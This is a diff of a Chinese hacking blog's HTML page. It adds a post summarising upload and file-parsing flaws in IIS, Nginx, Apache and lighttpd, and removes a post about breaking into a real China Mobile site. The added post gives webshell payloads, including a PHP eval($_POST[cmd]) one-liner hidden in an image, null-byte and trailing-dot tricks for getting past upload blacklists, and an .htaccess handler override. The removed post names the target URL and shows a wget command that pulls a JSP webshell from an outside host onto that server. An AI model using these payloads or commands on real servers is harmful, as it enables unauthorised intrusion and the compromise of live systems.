@@ -161,6 +161,85 @@ function dispatch() {
 
       <div class="body-wrap">
   
+    <article id="post-370" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/02/07/370/" class="article-date">
+  	<time datetime="2013-02-07T11:07:38.000Z" itemprop="datePublished">2013-02-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/02/07/370/">各大Web服务器解析漏洞总结</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>各大Web服务器解析漏洞总结<br>From:90sec</p>
+<p>[+]IIS 6.0</p>
+<p>&nbsp;</p>
+<p><pre>目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码 IIS6.0会将 xx.jpg 解析为 asp 文件。后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名) IIS6.0都会把此类后缀文件成功解析为 asp 文件。默认解析：/xx.asa    /xx.cer   /xx.cdx IIS6.0默认的可执行文件除了 asp 还包含这三种此处可联系利用目录解析漏洞/xx.asa/xx.jpg 或/xx.cer/xx.jpg 或 xx.asa;.jpg</pre><br>&nbsp;</p>
+<p>[+]IIS 7.0/IIS 7.5/Nginx &lt;8.03</p>
+<p>&nbsp;</p>
+<p><pre>IIS 7.0/IIS 7.5/Nginx&lt;8.03在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。常用利用方法：将一张图和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾  e.g.  copy xx.jpg/b + yy.txt/a xy.jpg ######################################/b 即二进制[binary]模式/a 即ascii模式 xx.jpg正常图片文件  yy.txt 内容&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;意思为写入一个内容为&lt;?php eval($_POST[cmd])?&gt;名称为shell.php的文件######################################找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上/xx.php 即可执行恶意文本。然后就在图片目录下生成一句话木马 shell.php 密码 cmd</pre><br>&nbsp;</p>
+<p>[+]Nginx &lt;8.03</p>
+<p>&nbsp;</p>
+<p><pre>在Fast-CGI关闭的情况下，Nginx&lt;8.03依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将/xx.jpg%00.php解析为 php 文件。</pre><br>&nbsp;</p>
+<p>[+]Apache</p>
+<p>&nbsp;</p>
+<p><pre>后缀解析：test.php.x1.x2.x3  Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析  test.php.x1.x2.x3 则会被解析为php 经验之谈：php|php3|phtml 多可被Apache解析</pre><br>&nbsp;</p>
+<p>[+]其他一些可利用的</p>
+<p>&nbsp;</p>
+<p><pre>在windows环境下，xx.jpg[空格]或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。我记得FckPhp2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}如果在Apache中.htaccess可被执行（默认不执行，这是90sec里的一位朋友说的，当初我并不知道），且可以被上传，那可以尝试在.htaccess中写入:&lt;FilesMatch“shell.jpg”&gt;SetHandler application/x-httpd-php &lt;/FilesMatch&gt; shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件</pre><br>&nbsp;</p>
+<p>[+]lighttpd</p>
+<p>&nbsp;</p>
+<p><pre>xx.jpg/xx.php  [Addby loser]</pre><br>&nbsp;</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Hack/">Hack</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
+  
     <article id="post-364" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -866,68 +945,6 @@ function dispatch() {
       
 	<div class="article-category tagcloud">
 	<a class="article-category-link" href="/categories/Others/">Others</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
-    <article id="post-267" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2012/12/15/267/" class="article-date">
-  	<time datetime="2012-12-15T04:05:27.000Z" itemprop="datePublished">2012-12-15</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2012/12/15/267/">河南10086的陷落</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>看到struts2出来了，爆了好多大站，手痒，也来搞了一搞。</p>
-<p>一个10086的站点就下来了。</p>
-<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2012/12/20121214131828.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2012/12/20121214131828.png" alt="" title="20121214131828"></a></p>
-<p><a href="http://www.ha.10086.cn/zhaopin/jobFront/jobFront!seeJobHisFront.action?id=1116" target="_blank" rel="external">http://www.ha.10086.cn/zhaopin/jobFront/jobFront!seeJobHisFront.action?id=1116</a><br>ls /opt/tomcat7.0/webapps/zhaopin/upload</p>
-<p>wget -O /opt/tomcat7.0/webapps/zhaopin/upload/help.jsp <a href="http://test-mozutaba.rhcloud.com/jsp.txt" target="_blank" rel="external">http://test-mozutaba.rhcloud.com/jsp.txt</a></p>
-<p>echo disable&gt;/opt/tomcat7.0/webapps/zhaopin/upload/read.txt</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Hack/">Hack</a>
 	</div>
 
 
